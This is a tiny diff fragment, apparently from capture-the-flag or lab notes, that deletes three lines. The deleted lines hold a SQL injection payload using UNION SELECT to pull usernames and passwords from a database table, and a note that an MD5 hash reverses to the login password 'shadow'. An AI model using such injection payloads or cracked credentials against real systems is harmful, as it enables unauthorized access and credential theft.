@@ -1,3 +1,0 @@
-1 UNION ALL SELECT username,password FROM Member_Brute_Force.db_default;
-
-md5 hash reverse => shadow : is password to login
